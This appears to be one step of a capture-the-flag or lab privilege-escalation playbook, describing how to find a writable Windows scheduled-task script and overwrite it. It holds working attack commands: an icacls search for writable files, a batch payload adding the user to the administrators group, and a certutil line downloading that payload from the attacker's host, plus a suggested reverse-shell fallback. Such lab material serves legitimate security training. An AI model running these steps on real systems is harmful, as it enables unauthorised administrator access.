# Windows - Scheduled Task Abuse

**Step 31 of 50 · Windows**

*Check whether a scheduled task script is writable, then replace it with a privilege-escalation command.*

## Run this

Check file permissions on task-related directories:

```cmd
icacls C:\ /T 2>nul | findstr "(F)" | findstr /i "users everyone authenticated"
```

Read the original script content before touching it:

```cmd
type C:\Log-Management\job.bat
```

On Kali, create a payload and restore file:

```bash
echo '@echo off
net localgroup administrators $Username /add' > $BoxDir/www/payload.bat

# Also save the original script content to restore later
cat > $BoxDir/www/restore.bat << 'EOF'
<original script contents>
EOF

www   # serve $BoxDir/www/ on port 80
```

On the target, download and replace the script:

```cmd
certutil -urlcache -f http://$LocalIP/payload.bat C:\Users\$Username\payload.bat
copy /Y C:\Users\$Username\payload.bat C:\Log-Management\job.bat
type C:\Log-Management\job.bat
```

Wait up to 5 minutes for the task to fire, then confirm:

```cmd
net localgroup administrators
```

## Example output

Writable script found by icacls:

```
C:\Log-Management\job.bat BUILTIN\Users:(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Administrators:(I)(F)
```

Task fired — current user added to admin group:

```
Alias name     administrators
Members
---------------
Administrator
username
```

## What did you get?

- [ ] `BUILTIN\Users:(F)` without `(I)` is shown → **This is explicitly set, not inherited — it's the intended attack surface**
- [ ] No writable script or task found → **Go to Step 32 · [[Windows - Credential Search]]**
- [ ] Payload in place, waiting → **Check `net localgroup administrators` every 2 minutes**
- [ ] Username appears in admin group → **Read the root flag, then restore the original script and go to Step 33 · [[Windows - Clean Down]]**
- [ ] 10 minutes pass with no trigger → **Try a reverse shell payload instead of net localgroup, then revert**

After admin is confirmed, restore the original script:

```cmd
certutil -urlcache -f http://$LocalIP/restore.bat C:\Users\$Username\restore.bat
copy /Y C:\Users\$Username\restore.bat C:\Log-Management\job.bat
type C:\Log-Management\job.bat
del C:\Users\$Username\payload.bat
del C:\Users\$Username\restore.bat
```

## Notes

`net localgroup administrators $Username /add` is simpler than a reverse shell for this escalation — no listener, no connection timing, no drop risk. When a scheduled task runs as SYSTEM or a privileged account, adding yourself to the admin group is the cleanest primitive.

`certutil -urlcache -f <url> <dest>` is the standard Windows-without-PowerShell downloader. It works on older Windows Server builds where `Invoke-WebRequest` may not be available.

The scheduled task may not be visible via `schtasks /query` if the current user lacks `TASK_QUERY` rights on the custom task. Absence from the task list does not mean the task does not run — the writable script is the evidence.

## Gotcha

> [!warning] 💡
> `(F)` without `(I)` means the permission is explicitly set on this file, not inherited from the parent directory. That's the tell — someone deliberately granted write access. If you only see `(I)(F)`, check whether the parent directory itself is writable.

> [!warning] 💡
> Do not run the original script manually as the unprivileged user. Scripts that check `bcdedit` output for "Access" (the word in "Access denied") will exit immediately on the non-admin branch — and the `exit` at the bottom can close your shell session.
